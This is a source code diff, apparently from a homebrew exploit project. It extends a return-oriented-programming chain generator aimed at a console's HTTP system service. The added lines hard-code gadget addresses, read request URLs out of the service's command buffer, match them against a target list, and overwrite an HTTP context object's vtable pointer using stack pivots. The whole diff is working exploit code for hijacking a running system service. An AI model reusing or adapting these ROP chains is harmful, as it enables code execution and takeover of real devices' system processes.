@@ -52,6 +52,7 @@ u32 ROP_CMPR0R1_OVERWRITER0_BXLR = 0x00118400;//"cmp r0, r1" On mismatch r0 is s
 
 u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119a24;//"beq <addr of bx-lr>" Otherwise, ip = *r0(vtable ptr), ip = *(ip+0xcc), then bx ip.
 
+u32 ROP_strncmp = 0x001064dc;
 u32 ROP_memcpy = 0x0010d274;
 u32 ROP_svcControlMemory = 0x00100770;
 u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
@@ -256,7 +257,7 @@ void ropgen_copyu32(u32 **ropchain, u32 *http_ropvaddr, u32 ldr_addr, u32 str_ad
 	ropgen_strr0r1(ropchain, http_ropvaddr, str_addr, set_addr & 0x2);
 }
 
-void ropgen_writeu32(u32 **ropchain, u32 *http_ropvaddr, u32 value, u32 addr, u32 set_addr)
+void ropgen_writeu32(u32 **ropchain, u32 *http_ropvaddr, u32 value, u32 addr, u32 set_addr)//Total size: 0x28-bytes + <0x8 if set_addr is set>.
 {
 	ropgen_setr0(ropchain, http_ropvaddr, value);
 	ropgen_strr0r1(ropchain, http_ropvaddr, addr, set_addr);
@@ -293,7 +294,7 @@ void ropgen_blxip_popr3pc(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 r3va
 	ropgen_addword(ropchain, http_ropvaddr, r3val);
 }
 
-void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x80-bytes. params[0](r0) is at offset 0x40. params[1](r1) is at offset 0x50.
+void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x74-bytes. params[0](r0) is at offset 0x40. params[1](r1) is at offset 0x50.
 {
 	ropgen_setr0r2r1(ropchain, http_ropvaddr, params[2]);
 	ropgen_setr0(ropchain, http_ropvaddr, params[0]);
@@ -330,7 +331,7 @@ void ropgen_checkcond(u32 **ropchain, u32 *http_ropvaddr, u32 pivot_addr0, u32 p
 	if(type)ropgen_stackpivot(ropchain, http_ropvaddr, pivot_addr0);
 }
 
-void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)//Total size: 0x78-bytes.
+void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)//Total size: see ropgen_callfunc.
 {
 	u32 params[7] = {0};
 
@@ -344,7 +345,7 @@ void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u3
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_svcControlMemory, params);
 }
 
-void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 size)//Total size: 0x78-bytes.
+void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 size)//Total size: see ropgen_callfunc.
 {
 	u32 params[7] = {0};
 
@@ -355,7 +356,7 @@ void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 siz
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_memcpy, params);
 }
 
-void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 addr, u32 size, MemPerm mypermission, MemPerm otherpermission)//Total size: 0x78-bytes.
+void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 addr, u32 size, MemPerm mypermission, MemPerm otherpermission)//Total size: see ropgen_callfunc.
 {
 	u32 params[7] = {0};
 
@@ -569,7 +570,7 @@ Result setuphaxx_httpheap_sharedmem()
 
 	u32 *ptr;
 
-	u32 params[7] = {0};
+	u32 params[7];
 
 	u32 mainrop_endaddr;
 
@@ -667,6 +668,36 @@ Result setuphaxx_httpheap_sharedmem()
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_CreateContext, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original sysmodule one.
 
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//r0 = cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x10);//r0+= 0x10.
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = cmdbuf[4], URL ptr.
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x18, 1);//Write the URL ptr to ropheap+0x18.
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below memcpy with the above URL ptr.
+
+	ropgen_memcpy(&ropchain, &ropvaddr, ropheap+0x100, 0, 0x100);//Copy the first 0x100-bytes of the URL to ropheap+0x100.
+
+	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x1c, 1);//*((u32*)(ropheap+0x1c)) = 0;
+
+	for(pos=0; pos<targeturl_list_entcount; pos++)
+	{
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0);
+		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x74 + 0x8 + 0x40 + 0x30, 0);//if(<vtableptr value was set in a previous loop iteration>)<pivot to the end of this iteration block>
+
+		memset(params, 0, sizeof(params));
+		params[0] = ropheap+0x100;
+		params[1] = targeturl_list_vaddr + pos*sizeof(targeturlctx) + offsetof(targeturlctx, url);
+		params[2] = strnlen(targeturl_list[pos].url, 0xff);
+
+		ropgen_callfunc(&ropchain, &ropvaddr, ROP_strncmp, params);//if(strncmp(createcontext_inputurl, targeturl_list[pos].url, 0xff)==0)*((u32*)(ropheap+0x1c)) = targeturl_list[pos].vtableptr;
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);
+		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x30, 0);
+
+		ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list[pos].vtableptr, ropheap+0x1c, 1);
+	}
+
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x20 + 0x40 + 0x4, 0x3);//Overwrite the r4 value which gets popped below, with the saved cmdbuf ptr from above.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Restore r0 to the _this value copied above.
 	ropgen_setr4(&ropchain, &ropvaddr, 0);
@@ -689,13 +720,22 @@ Result setuphaxx_httpheap_sharedmem()
 
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0xc, ropvaddr + 0x40 + 0x50, 0x3);//Copy the contexthandle to the value which which will be used for r1 in the below func-call.
 
-	ropgen_callfunc(&ropchain, &ropvaddr,ROP_http_context_getctxptr, params);
+	memset(params, 0, sizeof(params));
+	ropgen_callfunc(&ropchain, &ropvaddr, ROP_http_context_getctxptr, params);
 
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x10, 1);//Write the contextptr to ropheap+0x10. This is the same object from httpc_cmdhandler *(_this+16) for context-sessions.
 
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);//When the vtableptr at ropheap+0x1c is set to zero(URL doesn't match any targets), jump over the below ROP which writes the vtableptr into the object.
+	ropgen_popr1(&ropchain, &ropvaddr, 0);
+	ropgen_checkcond(&ropchain, &ropvaddr, ropvaddr + 0x48 + 0x40 + 0x20 + 0x40 + 0x2c + 0x28, 0, 1);
+
+	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x1c, ropvaddr + 0x40 + 0x20 + 0x40 + 0x2c + 0x4, 0x3);//Copy the vtableptr from ropheap+0x1c which was previously initialized above, to the value which will be used for the below writeu32.
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x10, 1);
+
 	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
 	ropgen_movr1r0(&ropchain, &ropvaddr);
-	ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list[2].vtableptr, 0, 0);//Overwrite the vtable for the above object. TODO: Select which vtable to use via checking URLs stored in the targeturl_list.
+	ropgen_writeu32(&ropchain, &ropvaddr, 0, 0, 0);//Overwrite the vtable for the above object.
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_RETURN, __httpmainthread_cmdhandler_stackframe-4, 1);
 
